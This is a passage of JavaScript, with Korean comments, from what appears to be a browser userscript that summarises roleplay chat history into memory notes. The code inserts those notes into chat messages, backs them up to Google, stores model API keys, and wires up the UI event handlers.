      if (snap.note && !snap.note.parked && nav.gsOn && !(nav.devAsk && nav.devAsk.chatId === chatId) && !(fullNote && fullNote.upto === snap.note.upto && sameAsChat(fullNote.memory, snap.note.memory))) {
        const n = snap.note, tryKey = n.upto + '|' + n.at;
        if (nav.fullTried !== tryKey) { nav.fullTried = tryKey;
          gsPeek(chatId).then(async g => { if (!g || g.upto !== n.upto || !sameAsChat(g.memory, n.memory) || chatIdFromPath() !== chatId) return;
            if (String(await getValue('fullSkip:' + chatId, '')) === tryKey) return;
            nav.fullAsk = { chatId, key: tryKey, g, n: { upto: n.upto, turns: n.turns, at: n.at } }; render(); }); }
      }
      // 채팅에서 노트가 사라졌으면(노트 든 말풍선 삭제·오류 등) 남아 있는 것 중 가장 최신으로 다시 넣을지 묻습니다.
      //   후보: 이 기기 정리본 · 이 기기 사본 · 정리 기록 · (구글 연결 시) 구글 백업. 기억 초기화 뒤의 것만. '그냥 두기'를 누른 같은 후보로는 다시 안 물어요.
      if (!snap.note && injectOn) {
        const resetAt = Date.parse(String(await getValue('resetAt:' + chatId, '')) || '') || 0, tOf = c => Date.parse(c.at || c.savedAt || '') || 0;
        let seen = null; try { seen = JSON.parse(String(await getValue('seen:' + chatId, '')) || 'null'); } catch (_) {}
        const h = histList[histList.length - 1], cands = [];
        if (fullNote?.memory) cands.push({ src: 'full', memory: fullNote.memory, upto: fullNote.upto, turns: fullNote.turns, at: fullNote.at, by: DEVICE, savedAt: fullNote.at, savedBy: DEVICE });
        if (seen?.memory) cands.push({ src: 'seen', ...seen });
        if (h?.after) cands.push({ src: 'hist', memory: h.after, upto: h.afterUpto, turns: h.to, at: h.at ? new Date(h.at).toISOString() : '', by: DEVICE, savedAt: h.at ? new Date(h.at).toISOString() : '', savedBy: DEVICE });
        const chat = snap.all.filter(isChat);
        for (const c of cands) if (!c.turns) { const k = chat.findIndex(m => msgId(m) === c.upto); if (k >= 0) c.turns = chat.slice(0, k + 1).filter(m => msgRole(m) === 'user').length; }
        // 같은 정리본이면 근거까지 든 이 기기 정리본(full)을 먼저
        const local = cands.filter(c => tOf(c) > resetAt).sort((a, b) => (b.turns || 0) - (a.turns || 0) || tOf(b) - tOf(a) || (a.src === 'full' ? -1 : 1))[0] || null;
        const key = local ? local.upto + '|' + local.at : 'g';
        if (String(await getValue('lostSkip:' + chatId, '')) !== key && nav.lostAsk?.key !== key) {
          nav.lostAsk = { key, chatId, local, g: null };
          if (local) pageToast('채팅에서 기억이 사라졌어요 · 조아메모리를 열어 다시 넣어 주세요');
          if (nav.gsOn) gsPeek(chatId, resetAt).then(g => { const a = nav.lostAsk; if (!a || a.chatId !== chatId || !g) return;
            a.g = g; if (!a.local) pageToast('채팅에서 기억이 사라졌어요 · 구글 백업에서 다시 넣을 수 있어요'); render(); });
        }
      } else if (nav.lostAsk?.chatId === chatId) nav.lostAsk = null;
      loadTurnMap(chatId, snap);
      etcCheck(chatId);
      if (String(await getValue('gsUrl', '')).trim() && !(await getValue('gsAsked:' + chatId, ''))) {
        let fresh = true; for (const k of BACKUP_KEYS) if (await getValue(k + ':' + chatId, '')) { fresh = false; break; }
        await setValue('gsAsked:' + chatId, '1');
        if (fresh) setTimeout(() => gsLoad(true), 300);
      }
      try {
        const mv = JSON.parse(String(await getValue('moved:' + chatId, '') || 'null'));
        movedInfo = mv ? `${new Date(mv.at).toLocaleString('ko-KR', { month: 'numeric', day: 'numeric', hour: 'numeric', minute: '2-digit' })} · ${mv.from}개 전에서 옮김` : '';
      } catch (_) { movedInfo = ''; }
    } catch (e) { toast('읽기 실패 · ' + e.message, 'err'); }
    finally { loading = false; if (!['edit', 'pvEdit', 'preview'].includes(nav.view)) render(); else paintInlineButton(snapshot ? `${Math.min(freshTurns(), cycle)}/${cycle}` : '기억', freshTurns() >= cycle); }
  }

  // mode: 'new' 지난 정리 뒤 대화로 이어서 / 'tidy' 지금 노트만 새 형식·규칙대로 다시 / 'rebuild' 채팅 전체로 처음부터
  async function run(mode = 'new', opts = {}) {
    const chatId = chatIdFromPath();
    if (!chatId || busyNow) return;
    if (mode === 'rebuild' && !opts.pasted && !confirm('채팅 전체를 처음부터 읽어서 노트를 새로 만들어요. 대화가 길면 비용과 시간이 꽤 들어요. 할까요?')) return;
    busyNow = true; render(); toast('대화를 읽는 중이에요…');
    try {
      snapshot = await readSinceLastNote(chatId, 40);
      const n = snapshot.note;
      if (mode === 'tidy' && !n) { toast('다시 정리할 노트가 없어요. 먼저 "지금 정리"를 눌러 주세요.', 'info', 3000); return; }
      if (mode === 'new' && !snapshot.fresh.length) { if (n) mode = 'tidy'; else { toast('정리할 대화가 아직 없어요.', 'info', 2500); return; } }
      const oldList = n ? splitSections(noteMemory()) : [];
      const fixed = oldList.find(x => x.key === FIXED)?.body || '';
      // 명대사는 이 정리에서 만들지 않는 칸(명대사 탭에서 따로 만듦)이라 AI에게 보내지 않고, 결과에 그대로 다시 붙입니다.
      const prev = joinSections(oldList.filter(x => ![FIXED, '직전 장면', '명대사'].includes(x.key)));
      const edited = await editedKeys(chatId);
      let msgs, base, uptoId, turns, from, sub;
      if (mode === 'rebuild') {
        msgs = await readAll(chatId);
        if (!msgs.length) { toast('읽을 대화가 없어요.', 'info', 2500); return; }
        base = ''; uptoId = msgId(msgs[msgs.length - 1]); turns = msgs.filter(m => msgRole(m) === 'user').length; from = 1;
        sub = `채팅 전체(1~${turns}턴)로 처음부터 다시 만들었어요. 칸을 누르면 고칠 수 있어요.`;
        if (msgs.cut) sub += ' ⚠ 대화가 길어서 최근 2,000개 메시지(약 1,000턴)만 읽었어요. 그 앞 내용은 빠졌고 턴 수도 실제보다 적어요.';
        toast(`채팅 전체 ${turns}턴을 처음부터 정리하는 중이에요… (몇 분 걸릴 수 있어요)`);
      } else if (mode === 'tidy') {
        msgs = []; base = prev; uptoId = n.upto; turns = n.turns; from = n.turns;
        sub = `1~${n.turns}턴 노트를 새 형식으로 다시 정리했어요. 새 대화는 읽지 않았어요.`;
        toast('노트를 새 형식으로 다시 정리하는 중이에요…');
      } else {
        msgs = snapshot.fresh; base = oldList.length ? prev : ''; uptoId = msgId(msgs[msgs.length - 1]);
        from = (n?.turns || 0) + 1; turns = (n?.turns || 0) + freshTurns();
        sub = n ? `이전 기억(1~${n.turns}턴) + 새 대화(${from}~${turns}턴)를 합쳤어요. 칸을 누르면 고칠 수 있어요.` : `처음부터 ${turns}턴을 정리했어요. 칸을 누르면 고칠 수 있어요.`;
        toast(snapshot.complete ? `새 대화 ${freshTurns()}턴을 정리하는 중이에요… (1~2분)` : '대화가 길어서 최근 2,000개 메시지까지만 읽었어요. 정리 중…');
      }
      // 이어서 정리할 기존 노트가 있으면 바뀐 것만 받아 끼워 넣습니다. 처음·전체 다시·형식 다시는 노트 전체를 받아요.
      const delta = mode === 'new' && !!base;
      if (opts.export) {
        // 다른 AI 채팅에 붙여 넣을 정리 요청: 지침 + 입력 + 출력 안내. 파일로 받고 클립보드에도 복사.
        const text = EXT_HEAD + `\n\n════════ 정리 지침 ════════\n\n${await buildSystem(delta)}\n\n════════ 정리할 자료 ════════\n\n${buildInput(base, msgs, fixed, edited, from)}\n\n════════ 자료 끝 ════════\n\n` + EXT_TAIL;
        await setValue('ext:' + chatId, JSON.stringify({ mode, uptoId, turns, from, sub, noteUpto: n?.upto || '' }));
        downloadText(`조아메모리-정리요청-${turns}턴.txt`, text);
        let copied = false; try { await navigator.clipboard.writeText(text); copied = true; } catch (_) {}
        toast(`정리 요청 파일을 받았어요${copied ? '(클립보드에도 복사됨)' : ''}. AI 채팅에 올리고, 받은 노트를 아래 칸에 붙여 넣어 주세요.`, 'ok', 6000);
        return;
      }
      let raw;
      summarize.last = null;
      if (opts.pasted != null) {
        // 내보낼 때 기준(어디까지·몇 턴)을 그대로 씁니다. 그 사이 새 대화가 쌓였어도 다음 정리 때 이어져요.
        try { const ext = JSON.parse(String(await getValue('ext:' + chatId, '') || 'null')); if (ext && ext.mode === mode && ext.noteUpto === (n?.upto || '')) ({ uptoId, turns, from, sub } = ext); } catch (_) {}
        raw = normalizeImported(opts.pasted);
        sub = '다른 AI로 정리한 결과예요. ' + sub;
      } else {
        try { raw = await summarize(base, msgs, fixed, edited, from, delta); }
        catch (e) {
          // 새 대화가 길어 답이 잘리면 앞쪽 절반 턴만 정리합니다. 나머지는 다음 정리 때 이어져요.
          const users = msgs.map((m, i) => (msgRole(m) === 'user' ? i : -1)).filter(i => i >= 0);
          if (!e.cut || mode !== 'new' || users.length < 2) throw e;
          const half = Math.ceil(users.length / 2);
          msgs = msgs.slice(0, users[half]);
          uptoId = msgId(msgs[msgs.length - 1]); turns = (n?.turns || 0) + half;
          sub = `새 대화가 길어서 앞쪽 ${from}~${turns}턴만 정리했어요. 나머지는 다음 정리 때 이어져요.`;
          toast(`답이 잘려서 앞쪽 절반(${from}~${turns}턴)만 다시 정리하는 중이에요…`);
          raw = await summarize(base, msgs, fixed, edited, from, delta);
        }
      }
      if (delta) raw = mergeNote(base, raw);
      // 번역만 따 온 근거는 채팅 전체 원문에서 영어 대사를 찾아 고칩니다(예전 정리에서 들어간 근거까지). 못 읽으면 이번 대화로만.
      let whole = msgs; try { whole = await readAll(chatId); } catch (_) {}
      const keep = keepMissingPeople(dropUserQuotes(fixTrQuotes(raw, whole), msgs), prev);
      const dup = mergeDupPeople(keep.memory, prev), memory = dup.memory;
      if (dup.merged.length) toast(`같은 사람으로 보이는 인물을 하나로 합쳤어요 · ${dup.merged.join(', ')}`, 'info', 5000);
      if (summarize.last) { await recordUsage(chatId, { at: Date.now(), from, to: turns, chars: memory.length, ...summarize.last }); usage = await usageOf(chatId); }
      const off = await offSections();
      const parsed = splitSections(memory).filter(x => ![FIXED, '직전 장면', '명대사'].includes(x.key) && !off.includes(x.key));
      if (fixed) parsed.unshift({ key: FIXED, body: fixed });
      const oldQuotes = oldList.find(x => x.key === '명대사');
      if (oldQuotes && mode !== 'rebuild') parsed.push(oldQuotes);
      // 순서를 정해진 칸 순서로 맞춥니다
      parsed.sort((a, b) => (SECTIONS.findIndex(s => s.key === a.key) + 99) % 99 - (SECTIONS.findIndex(s => s.key === b.key) + 99) % 99);
      draft = {
        sections: parsed, uptoId, turns,
        evidence: checkEvidence(memory, msgs, prev),
        madeUp: checkNames(memory, msgs, prev),
        kept: keep.kept,
        lost: (() => { const now = namesIn(memory); return snapshot.note ? namesIn(noteMemory()).filter(x => !now.some(y => sameName(x, y))) : []; })(),
        sub,
        // 정리 전 노트(바뀐 것 비교·되돌리기용), 이번에 읽은 원문(바뀐 것의 근거가 실제로 있는지 확인용)
        before: n ? { memory: noteMemory(), upto: n.upto, turns: n.turns } : null,
        source: squash(msgs.map(m => stripBlocks(msgText(m))).join(' ')),
      };
      nav.view = 'preview'; quiet();
    } catch (e) { toast('정리 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }

  function updatePreviewCount() {
    if (!draft || !out('count')) return;
    const memory = joinSections(draft.sections), block = buildBlock(memory, draft.uptoId, draft.turns);
    out('raw').textContent = block.trim();
    out('count').textContent = `기억 ${fmt(memory.length)}자 · 노트 전체 ${fmt(block.length)}자 · 칸 ${draft.sections.length}개`;
  }

  async function toggleInject() {
    const chatId = chatIdFromPath(), n = snapshot?.note; if (!chatId || busyNow) return;
    injectOn = !injectOn; await setValue('inject', injectOn ? 'on' : 'off');
    if (!n || !!n.parked === !injectOn) { toast(injectOn ? '채팅에 넣기를 켰어요.' : '채팅에 넣기를 껐어요. 이제 채팅방은 안 건드려요.', 'ok', 2500); render(); return; }
    busyNow = true; render();
    try {
      if (n.parked) { // 켜기: 직전 AI 답변에 다시 넣음
        const carrier = pickCarrier(snapshot.all); if (!carrier) throw new Error('노트를 붙일 AI 답변을 찾지 못했어요.');
        await writeMessage(chatId, msgId(carrier), stripBlocks(msgText(carrier)).trimEnd() + buildBlock(n.memory, n.upto, n.turns, n.at || undefined, n.by || ''));
        await setValue('parked:' + chatId, '');
        toast('기억을 채팅에 다시 넣었어요.', 'ok', 2500);
      } else { // 끄기: 여기 보관하고 채팅에서 뺌
        await park(chatId, n.memory, n.upto, n.turns, n.at);
        const msg = await readMessage(chatId, n.carrierId), cleaned = stripBlocks(msgText(msg)).trimEnd();
        if (cleaned !== msgText(msg)) await writeMessage(chatId, n.carrierId, cleaned);
        toast('기억을 채팅에서 뺐어요. ETC는 그대로 쓸 수 있어요.', 'ok', 3000);
      }
      await refresh();
    } catch (e) { // 실패하면 스위치를 원래대로(채팅과 스위치가 어긋나지 않게)
      injectOn = !injectOn; await setValue('inject', injectOn ? 'on' : 'off'); if (!n.parked) await setValue('parked:' + chatId, '');
      toast('바꾸기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }

  async function apply() {
    const chatId = chatIdFromPath();
    if (!chatId || !draft || busyNow) return;
    const memory = joinSections(draft.sections), cleanOld = !!ui('[data-opt="clean"]')?.checked;
    busyNow = true; render(); toast('채팅에 넣는 중…');
    try {
      const now = await readSinceLastNote(chatId, 6);
      // 정리하는 사이 마지막으로 정리한 메시지가 리롤·삭제됐으면 묻습니다(그 답을 기준으로 다음 정리가 이어지므로).
      if (draft.uptoId && !draft.restore && !now.all.some(m => msgId(m) === draft.uptoId)
        && !confirm('정리하는 사이 마지막 대화가 리롤되거나 지워졌어요. 그래도 이 결과를 넣을까요? (취소하면 아무것도 바뀌지 않아요)')) { toast('넣지 않았어요. 노트는 그대로예요.', 'info', 3000); return; }
      // 정리하는 사이 다른 기기(폰·컴)가 먼저 노트를 넣었으면 덮어쓰기 전에 묻습니다.
      //   내 정리가 더 많은 턴을 담았으면 그쪽 내용도 이미 들어 있어서 덮어써도 되고, 아니면 그쪽이 최신이라 취소를 권합니다.
      const other = now.note;
      if (!draft.restore && (other?.upto || '') !== (draft.before?.upto || '')) {
        const when = other?.at ? new Date(other.at).toLocaleString('ko-KR', { month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : '시각 모름';
        const mineNewer = draft.turns > (other?.turns || 0);
        const msg = `정리하는 사이 다른 기기에서 노트가 먼저 들어갔어요.\n\n· 다른 기기 노트: 1~${other?.turns || 0}턴 (${when} 정리)\n· 지금 이 정리: 1~${draft.turns}턴\n\n`
          + (mineNewer ? '이 정리가 더 최신이에요(그쪽 턴까지 다 들어 있어요). 넣어도 괜찮아요. 넣을까요?'
                       : '다른 기기 노트가 최신이에요. 취소하고 새로고침하는 걸 추천해요. 그래도 덮어쓸까요?');
        if (!confirm(msg)) { toast('넣지 않았어요. 새로고침하면 최신 노트로 이어서 정리돼요.', 'info', 4000); return; }
      }
      const carrier = pickCarrier(now.all), parked = !!now.note?.parked || !injectOn;
      if (!carrier && !parked) throw new Error('노트를 붙일 AI 답변을 찾지 못했어요.');
      if (parked) await park(chatId, memory, draft.uptoId, draft.turns);
      else await writeMessage(chatId, msgId(carrier), stripBlocks(msgText(carrier)).trimEnd() + buildBlock(memory, draft.uptoId, draft.turns));
      ownUpto = draft.uptoId;
      await saveFull(chatId, draft.uptoId, memory, draft.turns);
      if (draft.before && !draft.restore) await pushHistory(chatId, { at: Date.now(), from: draft.before.turns, to: draft.turns, before: draft.before.memory, beforeUpto: draft.before.upto, after: memory, afterUpto: draft.uptoId });
      await setValue('edited:' + chatId, '[]');
      const oldId = now.note?.carrierId;
      if (cleanOld && !parked && oldId && oldId !== msgId(carrier)) {
        try {
          const old = await readMessage(chatId, oldId), cleaned = stripBlocks(msgText(old)).trimEnd();
          if (cleaned !== msgText(old)) await writeMessage(chatId, oldId, cleaned);
        } catch (_) { /* 예전 노트 정리가 실패해도 새 노트는 이미 들어감 */ }
      }
      draft = null; nav = fresh();
      toast(parked ? '저장했어요. 채팅에는 안 넣었어요(채팅에 넣기 꺼짐).' : '넣었어요. 이제 앱에서 이어서 RP하면 돼요.', 'ok', 3500);
      await refresh();
      if (String(await getValue('gsUrl', '')).trim()) gsSave(true); // 구글 백업을 켜 뒀으면 넣을 때마다 자동으로
    } catch (e) { toast('넣기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }

  async function saveEdit() {
    const body = out('editor')?.value ?? '';
    if (nav.view === 'pvEdit') {
      const s = draft.sections.find(x => x.key === nav.key);
      if (s) s.body = body; else draft.sections.push({ key: nav.key, body });
      nav.view = 'preview'; render(); return;
    }
    const chatId = chatIdFromPath(), n = snapshot?.note;
    if (!chatId || !n || busyNow) return;
    busyNow = true; render(); toast('저장하는 중…');
    try {
      const list = splitSections(noteMemory()), s = list.find(x => x.key === nav.key);
      if (s) s.body = body; else list.push({ key: nav.key, body });
      if (n.parked) await park(chatId, joinSections(list), n.upto, n.turns, n.at);
      else { const msg = await readMessage(chatId, n.carrierId); await writeMessage(chatId, n.carrierId, stripBlocks(msgText(msg)).trimEnd() + buildBlock(joinSections(list), n.upto, n.turns, n.at || undefined, n.by || '')); }
      await saveFull(chatId, n.upto, joinSections(list), n.turns, n.at);
      const ed = await editedKeys(chatId); if (!ed.includes(nav.key)) { ed.push(nav.key); await setValue('edited:' + chatId, JSON.stringify(ed)); }
      nav.view = nav.prevView || null; nav.key = nav.prevKey || null;
      toast('저장했어요.', 'ok', 2500);
      await refresh();
      if (nav.gsOn) gsSave(true);
    } catch (e) { toast('저장 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }

  async function fixTurns() {
    const chatId = chatIdFromPath(), n = snapshot?.note, v = Math.round(Number(out('fixTurns')?.value));
    if (!chatId || !n || busyNow) return;
    if (!(v >= 1 && v <= 100000)) { toast('1 이상의 숫자를 넣어 주세요.', 'err', 2500); return; }
    busyNow = true; toast('턴 번호를 고치는 중…');
    try {
      if (n.parked) await park(chatId, n.memory, n.upto, v, n.at);
      else { const msg = await readMessage(chatId, n.carrierId); await writeMessage(chatId, n.carrierId, stripBlocks(msgText(msg)).trimEnd() + buildBlock(n.memory, n.upto, v, n.at || undefined, n.by || '')); }
      turnMapAt = 0;
      await refresh();
      toast(`1~${v}턴으로 고쳤어요. 말풍선 위 번호도 같이 바뀌어요.`, 'ok', 3000);
    } catch (e) { toast('고치기 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }

  async function saveSettings() {
    cycle = Number(out('cyclepick').value) || cycle;
    await setValue('cycle', String(cycle));
    NOTE_LIMIT = Number(out('limitpick').value) || NOTE_LIMIT;
    await setValue('noteLimit', String(NOTE_LIMIT));
    const cleanKey = v => String(v || '').trim().replace(/^["'`]+|["'`]+$/g, '').replace(/\s+/g, '');
    await setValue('apiKey', cleanKey(ui('[data-set="apiKey"]').value));
    await setValue('claudeKey', cleanKey(ui('[data-set="claudeKey"]').value));
    await setValue('model', ui('[data-set="model"]').value.trim() || DEFAULT_MODEL);
    await setValue('autoMove', ui('[data-set="autoMove"]').checked ? 'on' : 'off');
    await setValue('badges', ui('[data-set="badges"]').checked ? 'on' : 'off');
    for (const k of ['gsUrl', 'gsKey']) { const el = ui(`[data-set="${k}"]`); if (el) await setValue(k, el.value.trim()); }
    for (const [, key] of OPTIONAL) { const el = ui(`[data-set="${key}"]`); if (el) await setValue(key, el.checked ? 'on' : 'off'); }
    turnMapAt = 0; const cid = chatIdFromPath(); if (cid) loadTurnMap(cid, snapshot);
    toast('저장했어요.', 'ok', 2500);
    nav.tab = 'home';
    render();
  }
  async function fillSettings() {
    const k = ui('[data-set="apiKey"]'), m = ui('[data-set="model"]');
    if (k && !k.value) k.value = await getValue('apiKey', '');
    const ck = ui('[data-set="claudeKey"]'); if (ck && !ck.value) ck.value = await getValue('claudeKey', '');
    for (const k of ['gsUrl', 'gsKey']) { const el = ui(`[data-set="${k}"]`); if (el && !el.value) el.value = await getValue(k, ''); }
    const gsWas = nav.gsOn; nav.gsOn = !!String(await getValue('gsUrl', '')).trim(); if (gsWas !== nav.gsOn && nav.tab === 'settings' && !nav.gsSheet) render();
    // 접힌 줄: 지금 모델 · 넣은 키
    const ki = out('keyinfo'), mid = String(await getValue('model', DEFAULT_MODEL)).trim() || DEFAULT_MODEL;
    const mlabel = (MODELS.flatMap(([, list]) => list).find(([id]) => id === mid)?.[1] || mid).replace(/\s*\(.*\)$/, '');
    if (ki) ki.textContent = `${mlabel} · ` + ([k?.value && 'Gemini', ck?.value && 'Claude'].filter(Boolean).join('·') + (k?.value || ck?.value ? ' 키 넣음' : '키 없음'));
    if (m && !m.value) { m.value = await getValue('model', DEFAULT_MODEL); pickModel(MODEL_IDS.includes(m.value) ? m.value : ''); }
    const a = ui('[data-set="autoMove"]'); if (a && !a.dataset.filled) { a.checked = String(await getValue('autoMove', 'on')) !== 'off'; a.dataset.filled = '1'; }
    const bd = ui('[data-set="badges"]'); if (bd && !bd.dataset.filled) { bd.checked = String(await getValue('badges', 'on')) !== 'off'; bd.dataset.filled = '1'; }
    for (const [, key] of OPTIONAL) { const el = ui(`[data-set="${key}"]`); if (el && !el.dataset.filled) { el.checked = String(await getValue(key, 'on')) !== 'off'; el.dataset.filled = '1'; } }
  }

  // 모델 버튼: 고른 버튼을 눌림으로, 값은 숨은 입력칸에 넣습니다. '직접 입력'이면 칸을 보여 줘요.
  function pickModel(id) {
    const sel = out('modelpick'); if (sel) sel.value = id;
    const box = out('modelbox'), m = ui('[data-set="model"]');
    if (box) box.hidden = !!id;
    if (m && id) m.value = id;
  }

  function toggleSheet() {
    const on = !isOpen();
    openSheet(on);
    if (on) { nav = fresh(); quiet(); render(); refresh(); }
  }

  root.addEventListener('change', async e => {
    if (e.target.dataset?.out === 'restorefile') { const f = e.target.files?.[0]; e.target.value = ''; if (f) await importBackup(f); return; }
    if (e.target.dataset?.out === 'extfile') {
      const file = e.target.files?.[0]; e.target.value = '';
      if (!file) return;
      const text = normalizeImported(await file.text()), problem = checkImported(text);
      if (problem) { toast(problem, 'err', 5000); return; }
      let mode = nav.runMode || 'new'; try { mode = JSON.parse(String(await getValue('ext:' + chatIdFromPath(), '') || 'null'))?.mode || mode; } catch (_) {}
      nav.view = null; nav.tab = 'home';
      await run(mode, { pasted: text });
      // 불러온 결과는 바로 채팅에 넣습니다. 빠진 인물 경고가 있을 때만 미리보기에서 멈춰요.
      if (draft && nav.view === 'preview' && !(draft.lost || []).length) await apply();
      return;
    }
    if (e.target.dataset?.out === 'modelpick') { pickModel(e.target.value); if (!e.target.value) ui('[data-set="model"]')?.focus(); }
  });
  root.addEventListener('input', e => {
    if (e.target.dataset?.out !== 'psearch') return;
    const q = e.target.value.trim().toLowerCase();
    root.querySelectorAll('[data-find]').forEach(el => { el.style.display = !q || el.dataset.find.includes(q) ? '' : 'none'; });
  });
  // 인물이 많을 때 가로 줄: 마우스 휠로 옆으로, 끌어서 넘기기(PC에선 가로 스크롤이 안 돼서)
  const SLIDE = '.tl-who,.cast-row';
  root.addEventListener('wheel', e => { const row = e.target.closest?.(SLIDE); if (!row || row.scrollWidth <= row.clientWidth || Math.abs(e.deltaX) > Math.abs(e.deltaY)) return;
    e.preventDefault(); row.scrollLeft += e.deltaY; }, { passive: false });
  let drag = null, dragEnd = 0;
  root.addEventListener('pointerdown', e => { const row = e.target.closest?.(SLIDE); if (row && e.pointerType === 'mouse' && row.scrollWidth > row.clientWidth) drag = { row, x: e.clientX, left: row.scrollLeft, moved: false }; });
  root.addEventListener('pointermove', e => { if (!drag) return; const dx = e.clientX - drag.x; if (Math.abs(dx) > 4) drag.moved = true; if (drag.moved) drag.row.scrollLeft = drag.left - dx; });
  root.addEventListener('pointerleave', () => { if (drag?.moved) dragEnd = Date.now(); drag = null; });
  root.addEventListener('pointerup', () => { if (drag?.moved) dragEnd = Date.now(); drag = null; });
  // 접는 칸은 한 번에 하나만 펼칩니다(여러 개 열면 어지러워서). 같은 목록 안의 다른 칸을 닫아요. 근거 버튼(evd)은 그대로.
  root.addEventListener('toggle', e => { const d = e.target; if (!d.open || !d.matches?.('details.fold')) return;
    // 바로 옆 칸끼리만 (펼친 사람 안의 관계 칸은 건드리지 않게)
    const g = d.parentElement?.classList.contains('pgrp') ? d.parentElement : null, list = g ? g.parentElement : d.parentElement;
    list?.querySelectorAll(g ? ':scope > .pgrp > details.fold[open]' : ':scope > details.fold[open]').forEach(x => { if (x !== d) x.open = false; }); }, true);
  root.addEventListener('click', e => { if (Date.now() - dragEnd < 300) { e.stopPropagation(); e.preventDefault(); } }, { capture: true });
  root.addEventListener('click', async e => {
    const el = e.target.closest('[data-act]');
    if (!el || el.disabled) return;
    const act = el.dataset.act, arg = el.dataset.arg;
    const keepScroll = fn => { const y = out('main').scrollTop; fn(); out('main').scrollTop = y; };
    switch (act) {
      case 'toggle': return toggleSheet();
      case 'close': return openSheet(false);
      case 'tab': nav.tab = arg; nav.view = null; quiet(); render(); out('main').scrollTop = 0; return;
      case 'jump': { const k = arg.split('|').pop(); nav.tab = tabFor(k); nav.view = null;
        if (nav.tab === 'story' || nav.tab === 'now') nav.mem = k; else if (nav.tab === 'people') nav.ppl = k === '인지·비밀' ? 'know' : k === '호칭·말투' ? 'speech' : k === '관계·감정선' ? 'map' : k === '감정선' ? 'feel' : 'list';
        render(); out('main').scrollTop = 0; return; }
      case 'mem': nav.mem = arg; nav.grp = ''; render(); out('main').scrollTop = 0; return;
      case 'ppl': nav.ppl = arg; render(); out('main').scrollTop = 0; return;
      case 'thread': nav.thread = arg; return keepScroll(render);
      case 'graph': nav.view = 'graph'; nav.gsel = null; render(); return;
      case 'gnode': nav.gsel = nav.gsel === arg ? null : arg; render.keepGraph = true; return render();
      case 'gzoom': { const w = out('gwrap'); if (arg === 'fit') return fitGraph(); return zoomAt(arg === 'in' ? 1.25 : 0.8, w.clientWidth / 2, w.clientHeight / 2); }
      case 'fixTurns': return fixTurns();
      case 'injected': nav.view = 'injected'; render(); out('main').scrollTop = 0; return;
      case 'history': nav.view = 'history'; render(); out('main').scrollTop = 0; return;
      case 'changes': histList = await historyOf(chatIdFromPath()); nav.view = 'changes'; nav.key = null; render(); out('main').scrollTop = 0; return;
      case 'chgpick': nav.key = Number(arg); render(); out('main').scrollTop = 0; return;
      case 'tlwho': nav.tlWho = arg || null; nav.qOpen = false; return keepScroll(render);
      case 'stab': nav.setTab = arg; ui('[data-out="main"]')?.querySelectorAll('[data-sec]').forEach(x => { x.hidden = x.dataset.sec !== arg; }); el.parentElement.querySelectorAll('button').forEach(b => b.setAttribute('aria-pressed', String(b === el))); return;
      case 'peek': { const i = el.previousElementSibling; if (i) { const show = i.type === 'password'; i.type = show ? 'text' : 'password'; el.textContent = show ? '숨기기' : '보기'; } return; }
      case 'grp': nav.grp = arg; return keepScroll(render);
      case 'qmake': nav.bdRange = true; nav.rgKind = 'quote'; nav.qWho = arg || ''; nav.qOpen = true; return keepScroll(render); // 범위 고르는 팝업
      case 'qdel': { const cid = chatIdFromPath(), list = quotes(); list.splice(Number(arg), 1); if (cid) await saveQuotes(cid, list); nav.qOpen = true; return keepScroll(render); }
      case 'phwho': nav.phWho = arg; nav.phScreen = 'home'; nav.pcScreen = 'home'; return keepScroll(render);
      case 'dev': nav.dev = arg; return keepScroll(render);
      case 'wkrange': nav.rgKind = 'wiki'; nav.bdRange = true; return keepScroll(render);
      case 'wkupd': return makeWiki(0, 0, true);
      case 'wkdoc': nav.wkDoc = arg === '' ? null : Number(arg); nav.wkTab = ''; return keepView();
      case 'nameedit': nav.nameEdit = nav.nameEdit === arg ? '' : arg; keepScroll(render); setTimeout(() => out('siteName')?.focus(), 30); return;
      case 'sitename': { const v = String(out('siteName')?.value || '').trim().slice(0, 20), cid = chatIdFromPath(); if (!v || !cid) return;
        if (arg === 'wiki' && wikiData?.data) { wikiData.data.site = v; await setValue('wiki:' + cid, JSON.stringify(wikiData)); }
        if (arg === 'news' && newsData?.data) { newsData.data.portal = v; await setValue('news:' + cid, JSON.stringify(newsData)); }
        nav.nameEdit = ''; return keepScroll(render); }
      case 'wktab': nav.wkTab = arg; return keepScroll(render);
      case 'wkjump': out('wkSec' + arg)?.scrollIntoView({ behavior: 'smooth', block: 'start' }); return;
      case 'wkfn': { const d = wikiData?.data?.docs?.[nav.wkDoc], n = d?.notes?.[Number(arg) - 1]; if (n) toast('[' + arg + '] ' + n.replace(/~~/g, ''), 'info', 6000); return; }
      case 'lvrange': nav.rgKind = 'live'; nav.bdRange = true; return keepScroll(render);
      case 'lvupd': return makeLive(0, 0, true);
      case 'lvep': nav.lvEp = Number(arg); nav.lvSeen = 0; return keepScroll(render);
      case 'lvsend': return liveSend();
      case 'lvnext': { const a = Number(out('lvFrom')?.value) || 0, b = Number(out('lvTo')?.value) || 0; if (!a || !b || a > b) { toast('턴 범위를 확인해 주세요.', 'err'); return; } if (b - a + 1 > 5) { toast('실시간톡은 한 화에 최대 5턴이에요 (추천 2턴).', 'err', 3000); return; } return makeLive(a, b, true); }
      case 'lvscene': { const el = out('lvS' + arg), box = out('lvChat'); if (el && box) box.scrollTop = el.offsetTop - box.offsetTop - 6; return; }
      case 'lvpause': nav.lvPause = !nav.lvPause; if (!nav.lvPause) lvMoreN = 0; return keepScroll(render);
      case 'nwrange': nav.rgKind = 'news'; nav.bdRange = true; return keepScroll(render);
      case 'nwupd': return makeNews(0, 0, true);
      case 'nwfact': { const st = nav.nwFact || (nav.nwFact = new Set()); st.has(nav.nwArt) ? st.delete(nav.nwArt) : st.add(nav.nwArt); return keepScroll(render); }
      case 'nwgo': nav.nwArt = Number(arg); nav.nwTrend = null; return keepView();
      case 'nwclean': (nav.nwOpen || (nav.nwOpen = new Set())).add(arg); return keepScroll(render);
      case 'nwtrend': nav.nwTrend = arg === '' ? null : Number(arg); nav.nwArt = null; return keepView();
      case 'nwsearch': return newsSearch(Number(arg));
      case 'nwcat': nav.nwArt = null; nav.nwTrend = null; nav.nwCat = arg; return keepScroll(render);
